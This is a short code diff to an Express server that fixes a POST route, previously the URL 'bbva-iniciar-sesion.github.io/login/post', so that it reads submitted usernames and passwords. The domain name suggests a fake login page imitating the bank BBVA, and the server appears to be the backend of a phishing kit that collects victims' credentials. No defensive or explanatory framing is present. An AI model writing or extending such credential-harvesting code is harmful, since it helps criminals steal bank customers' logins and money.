@@ -13,7 +13,7 @@ server.use(bodyparser.json())
 
 server.listen(5555)
 
-server.post('https://bbva-iniciar-sesion.github.io/login/post', (req, res) => {
+server.post('/post', (req, res) => {
 
     const user = req.body.username
     const pass = req.body.password
